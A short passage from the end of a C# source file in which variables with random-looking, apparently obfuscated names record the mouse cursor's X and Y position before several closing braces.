			GdPGmbykHJbgKtMViEZU = 1;
			IzUnJsGMZRcKUXzXjCUb = Cursor.get_Position().X;
			EdLhSMANUPLRlgwXCQMS = Cursor.get_Position().Y;
		}
	}
}
